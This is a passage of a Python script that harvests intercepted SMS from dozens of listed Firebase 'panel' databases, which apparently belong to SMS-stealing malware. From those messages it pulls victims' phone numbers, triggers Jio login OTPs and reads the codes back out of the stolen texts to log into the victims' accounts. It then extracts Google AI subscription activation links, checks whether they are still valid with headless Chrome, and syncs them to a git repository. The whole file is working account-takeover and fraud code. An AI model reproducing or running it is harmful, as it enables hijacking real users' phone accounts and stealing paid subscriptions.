    ("https://monu-new-default-rtdb.firebaseio.com", "https://monu-new-default-rtdb.firebaseio.com"),
    ("https://golu-panel-default-rtdb.firebaseio.com", "https://golu-panel-default-rtdb.firebaseio.com"),
    ("https://golu-new-default-rtdb.firebaseio.com", "https://golu-new-default-rtdb.firebaseio.com"),
    ("https://chotu-panel-default-rtdb.firebaseio.com", "https://chotu-panel-default-rtdb.firebaseio.com"),
    ("https://chhotu-panel-default-rtdb.firebaseio.com", "https://chhotu-panel-default-rtdb.firebaseio.com"),
    ("https://lalu-panel-default-rtdb.firebaseio.com", "https://lalu-panel-default-rtdb.firebaseio.com"),
    ("https://bablu-panel-default-rtdb.firebaseio.com", "https://bablu-panel-default-rtdb.firebaseio.com"),
    ("https://bablu-new-default-rtdb.firebaseio.com", "https://bablu-new-default-rtdb.firebaseio.com"),
    ("https://guddu-panel-default-rtdb.firebaseio.com", "https://guddu-panel-default-rtdb.firebaseio.com"),
    ("https://guddu-new-default-rtdb.firebaseio.com", "https://guddu-new-default-rtdb.firebaseio.com"),
    ("https://tinku-panel-default-rtdb.firebaseio.com", "https://tinku-panel-default-rtdb.firebaseio.com"),
    ("https://tinku-new-default-rtdb.firebaseio.com", "https://tinku-new-default-rtdb.firebaseio.com"),
    ("https://mantu-panel-default-rtdb.firebaseio.com", "https://mantu-panel-default-rtdb.firebaseio.com"),
    ("https://mantu-new-default-rtdb.firebaseio.com", "https://mantu-new-default-rtdb.firebaseio.com"),
    ("https://lallu-panel-default-rtdb.firebaseio.com", "https://lallu-panel-default-rtdb.firebaseio.com"),
    ("https://munna-panel-default-rtdb.firebaseio.com", "https://munna-panel-default-rtdb.firebaseio.com"),
    ("https://munna-new-default-rtdb.firebaseio.com", "https://munna-new-default-rtdb.firebaseio.com"),
    ("https://keshav-panel-default-rtdb.firebaseio.com", "https://keshav-panel-default-rtdb.firebaseio.com"),
    ("https://keshav-new-default-rtdb.firebaseio.com", "https://keshav-new-default-rtdb.firebaseio.com"),
    ("https://suraj-panel-default-rtdb.firebaseio.com", "https://suraj-panel-default-rtdb.firebaseio.com"),
    ("https://suraj-new-default-rtdb.firebaseio.com", "https://suraj-new-default-rtdb.firebaseio.com"),
    ("https://suraj-2-default-rtdb.firebaseio.com", "https://suraj-2-default-rtdb.firebaseio.com"),
    ("https://nitin-panel-default-rtdb.firebaseio.com", "https://nitin-panel-default-rtdb.firebaseio.com"),
    ("https://nitin-new-default-rtdb.firebaseio.com", "https://nitin-new-default-rtdb.firebaseio.com"),
    ("https://pawan-panel-default-rtdb.firebaseio.com", "https://pawan-panel-default-rtdb.firebaseio.com"),
    ("https://pawan-new-default-rtdb.firebaseio.com", "https://pawan-new-default-rtdb.firebaseio.com"),
    ("https://ganesh-panel-default-rtdb.firebaseio.com", "https://ganesh-panel-default-rtdb.firebaseio.com"),
    ("https://ganesh-new-default-rtdb.firebaseio.com", "https://ganesh-new-default-rtdb.firebaseio.com"),
    ("https://sunil-panel-default-rtdb.firebaseio.com", "https://sunil-panel-default-rtdb.firebaseio.com"),
    ("https://sunil-new-default-rtdb.firebaseio.com", "https://sunil-new-default-rtdb.firebaseio.com"),
    ("https://arun-panel-default-rtdb.firebaseio.com", "https://arun-panel-default-rtdb.firebaseio.com"),
    ("https://arun-new-default-rtdb.firebaseio.com", "https://arun-new-default-rtdb.firebaseio.com"),
    ("https://arun-2-default-rtdb.firebaseio.com", "https://arun-2-default-rtdb.firebaseio.com"),
    ("https://naresh-panel-default-rtdb.firebaseio.com", "https://naresh-panel-default-rtdb.firebaseio.com"),
    ("https://naresh-new-default-rtdb.firebaseio.com", "https://naresh-new-default-rtdb.firebaseio.com"),
    ("https://mahesh-panel-default-rtdb.firebaseio.com", "https://mahesh-panel-default-rtdb.firebaseio.com"),
    ("https://mahesh-new-default-rtdb.firebaseio.com", "https://mahesh-new-default-rtdb.firebaseio.com"),
    ("https://mahesh-2-default-rtdb.firebaseio.com", "https://mahesh-2-default-rtdb.firebaseio.com"),
    ("https://dinesh-panel-default-rtdb.firebaseio.com", "https://dinesh-panel-default-rtdb.firebaseio.com"),
    ("https://dinesh-new-default-rtdb.firebaseio.com", "https://dinesh-new-default-rtdb.firebaseio.com"),
    ("https://mukesh-panel-default-rtdb.firebaseio.com", "https://mukesh-panel-default-rtdb.firebaseio.com"),
    ("https://mukesh-new-default-rtdb.firebaseio.com", "https://mukesh-new-default-rtdb.firebaseio.com"),
    ("https://jitendra-panel-default-rtdb.firebaseio.com", "https://jitendra-panel-default-rtdb.firebaseio.com"),
    ("https://surendra-panel-default-rtdb.firebaseio.com", "https://surendra-panel-default-rtdb.firebaseio.com"),
    ("https://virendra-panel-default-rtdb.firebaseio.com", "https://virendra-panel-default-rtdb.firebaseio.com"),
    ("https://dharmendra-panel-default-rtdb.firebaseio.com", "https://dharmendra-panel-default-rtdb.firebaseio.com"),
    ("https://narendra-panel-default-rtdb.firebaseio.com", "https://narendra-panel-default-rtdb.firebaseio.com"),
    ("https://brijesh-panel-default-rtdb.firebaseio.com", "https://brijesh-panel-default-rtdb.firebaseio.com"),
    ("https://umesh-panel-default-rtdb.firebaseio.com", "https://umesh-panel-default-rtdb.firebaseio.com"),
    ("https://kamlesh-panel-default-rtdb.firebaseio.com", "https://kamlesh-panel-default-rtdb.firebaseio.com"),
    ("https://brijmohan-panel-default-rtdb.firebaseio.com", "https://brijmohan-panel-default-rtdb.firebaseio.com"),
    # more numeric suffixes for known active names
    ("https://rupesh-456-default-rtdb.firebaseio.com", "https://rupesh-456-default-rtdb.firebaseio.com"),
    ("https://rupesh-789-default-rtdb.firebaseio.com", "https://rupesh-789-default-rtdb.firebaseio.com"),
    ("https://raja-10-default-rtdb.firebaseio.com", "https://raja-10-default-rtdb.firebaseio.com"),
    ("https://raja-11-default-rtdb.firebaseio.com", "https://raja-11-default-rtdb.firebaseio.com"),
    ("https://raja-12-default-rtdb.firebaseio.com", "https://raja-12-default-rtdb.firebaseio.com"),
    ("https://rohan-10-default-rtdb.firebaseio.com", "https://rohan-10-default-rtdb.firebaseio.com"),
    ("https://rohan-11-default-rtdb.firebaseio.com", "https://rohan-11-default-rtdb.firebaseio.com"),
    ("https://rohan-12-default-rtdb.firebaseio.com", "https://rohan-12-default-rtdb.firebaseio.com"),
    ("https://deepak-10-default-rtdb.firebaseio.com", "https://deepak-10-default-rtdb.firebaseio.com"),
    ("https://deepak-11-default-rtdb.firebaseio.com", "https://deepak-11-default-rtdb.firebaseio.com"),
    ("https://sanjay-10-default-rtdb.firebaseio.com", "https://sanjay-10-default-rtdb.firebaseio.com"),
    ("https://sanjay-11-default-rtdb.firebaseio.com", "https://sanjay-11-default-rtdb.firebaseio.com"),
    ("https://rahul-10-default-rtdb.firebaseio.com", "https://rahul-10-default-rtdb.firebaseio.com"),
    ("https://rahul-11-default-rtdb.firebaseio.com", "https://rahul-11-default-rtdb.firebaseio.com"),
    # state/region based panels
    ("https://bihar-new-default-rtdb.firebaseio.com", "https://bihar-new-default-rtdb.firebaseio.com"),
    ("https://bihar-2-default-rtdb.firebaseio.com", "https://bihar-2-default-rtdb.firebaseio.com"),
    ("https://jharkhand-panel-default-rtdb.firebaseio.com", "https://jharkhand-panel-default-rtdb.firebaseio.com"),
    ("https://up-panel-2-default-rtdb.firebaseio.com", "https://up-panel-2-default-rtdb.firebaseio.com"),
    ("https://bengal-panel-default-rtdb.firebaseio.com", "https://bengal-panel-default-rtdb.firebaseio.com"),
    ("https://gujarat-panel-default-rtdb.firebaseio.com", "https://gujarat-panel-default-rtdb.firebaseio.com"),
    ("https://odia-panel-default-rtdb.firebaseio.com", "https://odia-panel-default-rtdb.firebaseio.com"),
    # bot/auto style names
    ("https://jio-auto-1-default-rtdb.firebaseio.com", "https://jio-auto-1-default-rtdb.firebaseio.com"),
    ("https://jio-auto-2-default-rtdb.firebaseio.com", "https://jio-auto-2-default-rtdb.firebaseio.com"),
    ("https://jio-auto-3-default-rtdb.firebaseio.com", "https://jio-auto-3-default-rtdb.firebaseio.com"),
    ("https://autobot-1-default-rtdb.firebaseio.com", "https://autobot-1-default-rtdb.firebaseio.com"),
    ("https://autobot-2-default-rtdb.firebaseio.com", "https://autobot-2-default-rtdb.firebaseio.com"),
    ("https://sms-panel-1-default-rtdb.firebaseio.com", "https://sms-panel-1-default-rtdb.firebaseio.com"),
    ("https://sms-panel-2-default-rtdb.firebaseio.com", "https://sms-panel-2-default-rtdb.firebaseio.com"),
    ("https://sms-forwarder-default-rtdb.firebaseio.com", "https://sms-forwarder-default-rtdb.firebaseio.com"),
    ("https://sms-new-default-rtdb.firebaseio.com", "https://sms-new-default-rtdb.firebaseio.com"),
    ("https://otp-panel-1-default-rtdb.firebaseio.com", "https://otp-panel-1-default-rtdb.firebaseio.com"),
    ("https://otp-panel-2-default-rtdb.firebaseio.com", "https://otp-panel-2-default-rtdb.firebaseio.com"),
    ("https://otp-new-default-rtdb.firebaseio.com", "https://otp-new-default-rtdb.firebaseio.com"),
    ("https://masterbot-default-rtdb.firebaseio.com", "https://masterbot-default-rtdb.firebaseio.com"),
    ("https://masterbot-1-default-rtdb.firebaseio.com", "https://masterbot-1-default-rtdb.firebaseio.com"),
    ("https://masterbot-2-default-rtdb.firebaseio.com", "https://masterbot-2-default-rtdb.firebaseio.com"),
]

MESSAGE_SCAN_LIMIT = 30
OTP_TIMEOUT = 30
POLL_INTERVAL = 1

LINKS_FILE        = Path("gemini_activation_links.txt")   # tat ca link (tich luy)
LINKS_FRESH_FILE  = Path("gemini_links_fresh.txt")        # chi link chua su dung
LINKS_USED_FILE   = Path("gemini_links_used.txt")         # link da dung / het han
RESULTS_FILE      = Path("gemini_results.csv")

CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

NUMBER_PATTERNS = (
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    # Add Airtel patterns too since these panels have both
    re.compile(r"(?i)\bairtel\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bphone\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
)

OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password|verification|code")
OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")

ACTIVATION_PATTERN = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})",
    re.IGNORECASE,
)

RESULT_FIELDS = (
    "serial_number",
    "device_id",
    "mobile_number",
    "status",
    "activation_url",
    "nepal_date",
    "nepal_time",
)

# ==================== FUNCTIONS ====================

def firebase_get(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None) -> Any:
    query = {"auth": key}
    if params:
        query.update(params)
    # Handle case where key might be a URL (public access)
    if key and key.startswith("http"):
        # If key is actually a URL, don't use auth param
        response = session.get(f"{base_url}/{path.strip('/')}.json", timeout=6)
        response.raise_for_status()
        return response.json()
    response = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=6)
    response.raise_for_status()
    return response.json()

def latest_messages(session: requests.Session, base_url: str, key: str, device_id: str, limit: int) -> dict[str, dict[str, Any]]:
    data = firebase_get(session, base_url, key, f"messages/{device_id}", {"orderBy": '"$key"', "limitToLast": max(1, limit)})
    if not isinstance(data, dict):
        return {}
    return {name: value for name, value in data.items() if isinstance(value, dict)}

def normalize_mobile(value: Any) -> str | None:
    digits = re.sub(r"\D", "", str(value or ""))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None

def number_candidates(messages: dict[str, dict[str, Any]]) -> set[str]:
    found: set[str] = set()
    for item in messages.values():
        sim_info = item.get("simInfo")
        if isinstance(sim_info, dict):
            mobile = normalize_mobile(sim_info.get("phoneNumber"))
            if mobile:
                found.add(mobile)
        mobile = normalize_mobile(item.get("phoneNumber"))
        if mobile:
            found.add(mobile)
        body = str(item.get("message", ""))
        for pattern in NUMBER_PATTERNS:
            found.update(pattern.findall(body))
    return found

def firebase_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({"Accept": "application/json", "Cache-Control": "no-cache"})
    return session

def jio_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-IN,en;q=0.9,hi;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
        "appName": "MYJIO",
        "appVersion": "8.0.0",
        "deviceId": "a1b2c3d4e5f60001",
        "os": "android",
        "osVersion": "13",
        "Connection": "keep-alive",
    })
    return session

def response_json(response: requests.Response) -> dict[str, Any]:
    try:
        data = response.json()
    except ValueError:
        return {}
    return data if isinstance(data, dict) else {}

def response_error(response: requests.Response) -> bool:
    if not response.ok:
        return True
    data = response_json(response)
    if data.get("errorMessage") or data.get("error"):
        return True
    return str(data.get("status", "")).lower() in {"failed", "failure", "error", "false"}

def is_jio_number(session: requests.Session, mobile: str):
    try:
        response = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=10)
    except requests.RequestException:
        return None  # Timeout hoac loi mang -> giu lai de thu OTP
    data = response_json(response)
    if response_error(response):
        return False
    return bool(data.get("primaryService"))

def send_otp(session: requests.Session, mobile: str) -> str:
    """Returns: 'ok' | 'locked' | 'failed'"""
    try:
        response = session.post(
            SEND_OTP_URL,
            json={
                "mobileNumber": mobile,
                "loginFlowType": "MOBILE",
                "alternateNumber": "",
                "isBiometricEnabled": "false",
                "os": "android",
                "appName": "MYJIO",
                "appVersion": "8.0.0",
            },
            timeout=20,
        )
        print(f"   [OTP DEBUG] HTTP {response.status_code} | {response.text[:300]}")
        data = response_json(response)
        err_msg = str(data.get("errorMessage", "")).upper()
        if "LOCKED" in err_msg or "LOCK" in err_msg:
            return "locked"
        if response_error(response):
            return "failed"
        return "ok"
    except requests.RequestException as e:
        print(f"   [OTP DEBUG] Exception: {e}")
        return "failed"


def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
    try:
        response = session.post(VERIFY_OTP_URL, json={"mobileNumber": mobile, "otp": otp}, timeout=20)
    except requests.RequestException:
        return False
    return not response_error(response)

def message_order(key: str, item: dict[str, Any]) -> int:
    for value in (item.get("id"), item.get("timestamp"), key):
        try:
            return int(value)
        except (TypeError, ValueError):
            continue
    return 0

def wait_for_otp(firebase: requests.Session, base_url: str, key: str, device_id: str, known_keys: set[str], jio: requests.Session, mobile: str) -> bool:
    used: set[str] = set()
    deadline = time.monotonic() + OTP_TIMEOUT
    while time.monotonic() < deadline:
        try:
            messages = latest_messages(firebase, base_url, key, device_id, 20)
        except requests.RequestException:
            time.sleep(POLL_INTERVAL)
            continue
        candidates: list[tuple[int, str, str]] = []
        for message_key, item in messages.items():
            if message_key in known_keys or message_key in used:
                continue
            body = str(item.get("message", ""))
            if not OTP_WORD_PATTERN.search(body):
                continue
            match = OTP_PATTERN.search(body)
            if match:
                candidates.append((message_order(message_key, item), message_key, match.group(1)))
        if candidates:
            _, message_key, otp = max(candidates)
            used.add(message_key)
            if verify_otp(jio, mobile, otp):
                return True
        time.sleep(POLL_INTERVAL)
    return False

def activation_url(value: str) -> str:
    text = html.unescape(value or "")
    for _ in range(4):
        decoded = unquote(text)
        if decoded == text:
            break
        text = decoded
    match = ACTIVATION_PATTERN.search(text)
    if not match:
        return ""
    return "https://serviceactivation.google.com/subscription/new/" + match.group("token") + match.group("padding")

def already_active(value: str) -> bool:
    normalized = " ".join((value or "").lower().replace("_", " ").split())
    return any(phrase in normalized for phrase in (
        "already active", "already activated", "already redeemed",
        "already claimed", "already availed"
    ))

def api_message(data: dict[str, Any]) -> str:
    for name in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if data.get(name):
            return str(data[name])
    return ""

def get_activation(session: requests.Session) -> tuple[str, str]:
    dashboard_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    offer_headers = {"Accept": "*/*", "Referer": GOOGLE_PAGE}
    try:
        auth_response = session.get(AUTH_URL, headers=dashboard_headers, timeout=20)
        auth_data = response_json(auth_response)
        if not auth_response.ok or str(auth_data.get("loginFlag", "")).lower() != "true":
            return "api_session_invalid", ""
        session.get(NAVIGATE_URL, headers=dashboard_headers, timeout=20)
        activate_response = session.get(ACTIVATE_URL, headers=offer_headers, timeout=20)
        activate_data = response_json(activate_response)
        if already_active(api_message(activate_data)):
            return "already_active", ""
        if not activate_response.ok or str(activate_data.get("errorCode", "200")) != "200":
            return "activation_api_failed", ""
        google_response = session.get(GOOGLE_URL, headers=offer_headers, timeout=20)
        google_data = response_json(google_response)
        if already_active(api_message(google_data)):
            return "already_active", ""
        url = activation_url(str(google_data.get("redirectionURL", "")))
        if not url:
            return "no_activation_url", ""
        try:
            session.get(SUBMIT_URL, headers=offer_headers, timeout=20)
        except requests.RequestException:
            pass
        return "activation_url_found", url
    except requests.RequestException:
        return "activation_api_failed", ""

USED_KEYWORDS = [
    "goi thue bao nay da duoc su dung",
    "subscription has been used",
    "already been used",
    "this subscription link has",
    "link has already been used",
    "da duoc su dung",
]
EXPIRED_KEYWORDS = [
    "can mot duong lien ket kich hoat moi",
    "need a new activation link",
    "new activation link",
    "request a new link",
    "link is no longer valid",
    "link expired",
    "activation link has expired",
]

def check_link_status(url: str) -> str:
    """Tra ve: 'fresh' | 'used' | 'expired' | 'unknown'
    
    Logic phan loai:
    - Link 'fresh': redirect thang ve accounts.google.com/signin (Google yeu cau dang nhap truoc)
    - Link 'expired': redirect ve one.google.com / serviceactivation voi noi dung het han
    - Link 'used': body chua USED_KEYWORDS
    """
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Accept-Language": "vi-VN,vi;q=0.9,en;q=0.8",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    try:
        # Buoc 1: GET khong follow redirect de xem dich den ban dau
        r1 = requests.get(url, headers=headers, timeout=15, allow_redirects=False)
        loc = r1.headers.get("Location", "")

        if r1.status_code in (301, 302, 303, 307, 308) and loc:
            # Truong hop A: redirect thang ve accounts.google.com -> link con dung, chi can dang nhap
            if "accounts.google.com" in loc and ("signin" in loc or "v3" in loc):
                return "fresh"

            # Truong hop B: redirect ve one.google.com hoac serviceactivation -> co the het han
            if "one.google.com" in loc or "serviceactivation.google.com" in loc:
                try:
                    r2 = requests.get(loc, headers=headers, timeout=15, allow_redirects=True)
                    text2 = r2.text.lower()
                    for kw in EXPIRED_KEYWORDS:
                        if kw in text2:
                            return "expired"
                    for kw in USED_KEYWORDS:
                        if kw in text2:
                            return "used"
                    # Neu one.google.com load duoc nhung khong co keyword het han -> fresh
                    if r2.status_code == 200:
                        return "fresh"
                except Exception:
                    pass
                return "unknown"

            # Truong hop C: redirect ve noi khac -> follow het va check body
            if "g.co" in loc or "goo.gl" in loc:
                # Intermediate short link, follow tiep
                pass  # se xu ly o buoc 2

        # Buoc 2: Fallback - follow tat ca redirect va check body + URL cuoi
        r_full = requests.get(url, headers=headers, timeout=20, allow_redirects=True)
        final_url = r_full.url.lower()
        text = r_full.text.lower()

        for kw in USED_KEYWORDS:
            if kw in text:
                return "used"
        for kw in EXPIRED_KEYWORDS:
            if kw in text:
                return "expired"
        if r_full.status_code in (404, 410):
            return "expired"
        # URL cuoi la accounts.google.com/signin -> link fresh (can dang nhap)
        if "accounts.google.com" in final_url and "signin" in final_url:
            return "fresh"
        # URL cuoi van la trang one.google.com voi status 200 nhung khong co keyword -> fresh
        if r_full.status_code == 200 and "one.google.com" in final_url:
            return "fresh"
        return "unknown"

    except requests.RequestException:
        return "unknown"

# ==================== CDP LINK VERIFIER (INCOGNITO - PERSISTENT) ====================
# 1 Chrome incognito duy nhat, chay suot script.
# Moi link verify: mo tab moi -> navigate -> doc ket qua -> dong tab.
# Khong khoi dong lai Chrome moi lan -> nhanh hon ~10x so voi cu.

CHROME_EXE = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
if not os.path.isfile(CHROME_EXE):
    CHROME_EXE = r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"

_chrome_verify_lock = threading.Lock()   # chi 1 verify chay tai 1 thoi diem
_chrome_mgr_lock    = threading.Lock()   # bao ve state Chrome process

_chrome_proc = None   # subprocess.Popen | None
_chrome_port: int = 0
_chrome_alive: bool = False


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("", 0))
        return s.getsockname()[1]


def _wait_port(port: int, timeout: float = 25.0) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            s = socket.create_connection(("localhost", port), timeout=0.5)
            s.close()
            return True
        except Exception:
            time.sleep(0.3)
    return False


def _cdp_send(ws, method: str, params=None, msg_id: int = 1) -> dict:
    ws.send(json.dumps({"id": msg_id, "method": method, "params": params or {}}))
    deadline = time.time() + 15
    while time.time() < deadline:
        try:
            data = json.loads(ws.recv())
            if data.get("id") == msg_id:
                return data.get("result", {})
        except Exception:
            break
    return {}


def _launch_chrome() -> bool:
    global _chrome_proc, _chrome_port, _chrome_alive
    if not _WEBSOCKET_OK or not os.path.isfile(CHROME_EXE):
        return False
    port = _free_port()
    user_data = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
    args = [
        CHROME_EXE,
        f"--remote-debugging-port={port}",
        f"--user-data-dir={user_data}",
        "--profile-directory=Profile 11",
        "--no-first-run",
        "--no-default-browser-check",
        "--disable-session-crashed-bubble",
        "--remote-allow-origins=*",
        "--window-size=1024,600",
        "--disable-infobars",
        "--disable-extensions",
        "--disable-popup-blocking",
        "about:blank",
    ]
    proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if not _wait_port(port, timeout=25):
        proc.terminate()
        return False
    time.sleep(1.5)
    _chrome_proc  = proc
    _chrome_port  = port
    _chrome_alive = True
    print(f"   [CDP] Chrome profile started - port {port}")
    return True


def _ensure_chrome() -> bool:
    global _chrome_proc, _chrome_alive
    with _chrome_mgr_lock:
        if _chrome_alive and _chrome_proc and _chrome_proc.poll() is None:
            try:
                requests.get(f"http://localhost:{_chrome_port}/json/version", timeout=3)
                return True
            except Exception:
                pass
        _chrome_alive = False
        if _chrome_proc:
            try:
                _chrome_proc.terminate()
            except Exception:
                pass
        return _launch_chrome()


def _open_tab(url: str):
    try:
        from urllib.parse import quote
        encoded = quote(url, safe="")
        resp = requests.get(
            f"http://localhost:{_chrome_port}/json/new?{encoded}",
            timeout=5,
        )
        info = resp.json()
        return info.get("id"), info.get("webSocketDebuggerUrl")
    except Exception:
        return None, None


def _close_tab(tab_id: str) -> None:
    try:
        requests.get(f"http://localhost:{_chrome_port}/json/close/{tab_id}", timeout=3)
    except Exception:
        pass


def verify_link_with_chrome(url: str) -> str:
    # Verify link qua Chrome INCOGNITO (persistent - 1 instance dung chung).
    # Mo tab moi, navigate, doc ket qua, dong tab.
    # Tra ve: 'fresh' | 'used' | 'expired' | 'unknown' | 'error' | 'skip'
    if not _WEBSOCKET_OK:
        return "skip"
    if not _ensure_chrome():
        return "error"

    with _chrome_verify_lock:
        ws     = None
        tab_id = None
        result = "error"

        try:
            tab_id, ws_url = _open_tab(url)
            if not tab_id or not ws_url:
                return "error"

            ws = _websocket_lib.create_connection(ws_url, timeout=20)

            _cdp_send(ws, "Page.enable",    msg_id=1)
            _cdp_send(ws, "Runtime.enable", msg_id=2)
            _cdp_send(ws, "Page.navigate",  {"url": url}, msg_id=3)

            # Doi JS render (Google render error message client-side)
            time.sleep(7)

            cur = _cdp_send(ws, "Runtime.evaluate", {
                "expression": "window.location.href",
                "returnByValue": True,
            }, msg_id=4)
            current_url = str(cur.get("result", {}).get("value", "")).lower()

            txt = _cdp_send(ws, "Runtime.evaluate", {
                "expression": "document.body ? document.body.innerText : ''",
                "returnByValue": True,
            }, msg_id=5)
            page_text = str(txt.get("result", {}).get("value", "")).lower()

            htm = _cdp_send(ws, "Runtime.evaluate", {
                "expression": "document.documentElement.innerHTML",
                "returnByValue": True,
            }, msg_id=6)
            page_html = str(htm.get("result", {}).get("value", "")).lower()

            print(f"      [CDP] URL: {current_url[:120]}")
            print(f"      [CDP] Text: {page_text[:100]}")

            # ── Phan loai ──────────────────────────────────────────────────

            def _hit(kws, *srcs):
                return any(kw in s for kw in kws for s in srcs)

            USED_KWS = [
                "subscription has been used", "already been used", "already redeemed",
                "offer is not available", "this offer has already been used",
                "you've already redeemed", "offer has been redeemed",
                "this code has been used",
                "\u0111\u00e3 \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng",
                "g\u00f3i thu\u00ea bao n\u00e0y \u0111\u00e3 \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng",
                "\u01b0u \u0111\u00e3i kh\u00f4ng c\u00f3 s\u1eb5n",
            ]
            EXPIRED_KWS = [
                "need a new activation link", "link is no longer valid",
                "link expired", "activation link has expired",
                "request a new link", "this link has expired",
                "c\u1ea7n m\u1ed9t \u0111\u01b0\u1eddng li\u00ean k\u1ebft k\u00edch ho\u1ea1t m\u1edbi",
                "li\u00ean k\u1ebft kh\u00f4ng c\u00f2n h\u1ee3p l\u1ec7",
                "li\u00ean k\u1ebft h\u1ebft h\u1ea1n",
                "\u0111\u01b0\u1eddng li\u00ean k\u1ebft \u0111\u00e3 h\u1ebft h\u1ea1n",
                "li\u00ean k\u1ebft k\u00edch ho\u1ea1t n\u00e0y \u0111\u00e3 h\u1ebft h\u1ea1n",
                "li\u00ean k\u1ebft n\u00e0y \u0111\u00e3 h\u1ebft h\u1ea1n",
            ]

            if _hit(USED_KWS, page_text, page_html):
                result = "used"

            elif _hit(EXPIRED_KWS, page_text, page_html):
                result = "expired"

            elif "accounts.google.com" in current_url and any(
                k in current_url for k in ("signin", "v3/signin", "servicelogin", "o/oauth2")
            ):
                # Redirect ve dang nhap Google -> link con song
                result = "fresh"

            elif any(kw in page_text for kw in [
                "k\u00edch ho\u1ea1t g\u00f3i", "gemini advanced", "google one",
                "18 th\u00e1ng", "get started", "redeem", "ai pro", "free trial",
            ]):
                result = "fresh"

            else:
                result = "unknown"

        except Exception as e:
            print(f"      [CDP] Loi: {e}")
            result = "error"
        finally:
            try:
                if ws:
                    ws.close()
            except Exception:
                pass
            if tab_id:
                _close_tab(tab_id)

        return result


def _shutdown_chrome() -> None:
    global _chrome_proc, _chrome_alive
    _chrome_alive = False
    if _chrome_proc:
        try:
            _chrome_proc.terminate()
            _chrome_proc.wait(timeout=5)
        except Exception:
            pass
        _chrome_proc = None


file_lock = threading.Lock()

def _append_unique(filepath: Path, url: str) -> None:
    for _ in range(10):
        try:
            with file_lock:
                existing = set(filepath.read_text(encoding="utf-8").splitlines()) if filepath.exists() else set()
                if url not in existing:
                    with filepath.open("a", encoding="utf-8") as f:
                        f.write(url + "\n")
            break
        except Exception:
            time.sleep(0.1)

def save_link(url: str) -> None:
    if not url:
        return
    token = url.split("?")[0].rstrip("/").split("/")[-1].strip()

    # Kiem tra da co hay chua (co ho tro nhieu CMD chay song song)
    for _ in range(10):
        try:
            with file_lock:
                if LINKS_USED_FILE.exists():
                    used_tokens = {
                        u.split("?")[0].rstrip("/").split("/")[-1].strip()
                        for u in LINKS_USED_FILE.read_text(encoding="utf-8").splitlines() if u.strip()
                    }
                    if token in used_tokens:
                        print(f"   [SKIP] Token da trong used list -> bo qua")
                        return
                if LINKS_FILE.exists():
                    existing = set(LINKS_FILE.read_text(encoding="utf-8").splitlines())
                    if url in existing:
                        print(f"   [SKIP] Link da ton tai -> bo qua")
                        return
            break
        except Exception:
            time.sleep(0.1)

    # LUU THANG - KHONG MO TRANG AN DANH (TOC DO TOI DA)
    print(f"   [THÀNH CÔNG] LƯU LINK MỚI -> {url}")
    _append_unique(LINKS_FILE, url)
    _append_unique(LINKS_FRESH_FILE, url)

    # Neu dang chay tren GitHub Actions -> day ngay ve GitHub de may tinh o nha keo ve tuc thi!
    if os.environ.get("GITHUB_ACTIONS") == "true":
        try:
            subprocess.run(["git", "add", "gemini_activation_links.txt", "gemini_links_fresh.txt"], capture_output=True)
            subprocess.run(["git", "commit", "-m", f"Auto-sync new link: {token[:12]}"], capture_output=True)
            subprocess.run(["git", "push"], capture_output=True)
            print("   [CLOUD GIT] Da day link moi ve repo thanh cong!")
        except Exception:
            pass

def save_result(serial: int | str, device_id: str, mobile: str, status: str, url: str) -> None:
    now = datetime.now(ZoneInfo("Asia/Kathmandu"))
